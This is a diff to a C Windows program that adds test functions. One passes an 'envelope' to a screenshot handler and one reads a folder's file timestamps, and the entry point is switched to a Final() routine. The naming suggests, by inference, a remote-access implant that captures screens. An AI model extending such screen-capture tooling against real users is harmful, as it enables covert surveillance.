@@ -2423,6 +2423,31 @@ void test145(void) {
 	WriteToFile(L"C:\\Users\\Admin\\Desktop\\screenshot.bmp", pBitmap->pBuffer, pBitmap->cbBuffer);
 }
 
+void test146(void) {
+	ENVELOPE Envelope;
+
+	SecureZeroMemory(&Envelope, sizeof(Envelope));
+	ScreenshotHandler(&Envelope);
+}
+
+void test147(void) {
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	FILETIME CreattionTime;
+	FILETIME LastAccessTime;
+	FILETIME LastWriteTime;
+
+	hFile = CreateFileW(L"C:\\Users\\Admin\\Documents\\SharedFolder\\session\\vendor", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+	if (hFile != INVALID_HANDLE_VALUE) {
+		GetFileTime(hFile, &CreattionTime, &LastAccessTime, &LastWriteTime);
+		PrintFormatA("CreattionTime.dwLowDateTime = %d\n", CreattionTime.dwLowDateTime);
+		PrintFormatA("CreattionTime.dwHighDateTime = %d\n", CreattionTime.dwHighDateTime);
+		PrintFormatA("LastAccessTime.dwLowDateTime = %d\n", LastAccessTime.dwLowDateTime);
+		PrintFormatA("LastAccessTime.dwHighDateTime = %d\n", LastAccessTime.dwHighDateTime);
+		PrintFormatA("LastWriteTime.dwLowDateTime = %d\n", LastWriteTime.dwLowDateTime);
+		PrintFormatA("LastWriteTime.dwHighDateTime = %d\n", LastWriteTime.dwHighDateTime);
+	}
+}
+
 BOOL IsExist
 (
 	PGLOBAL_CONFIG pConfig
@@ -2857,8 +2882,10 @@ int WinMain
 	//test142();
 	//test143();
 	//test144();
-	test145();
-	//Final();
+	//test145();
+	//test146();
+	//test147();
+	Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
 	if (hThread != NULL) {
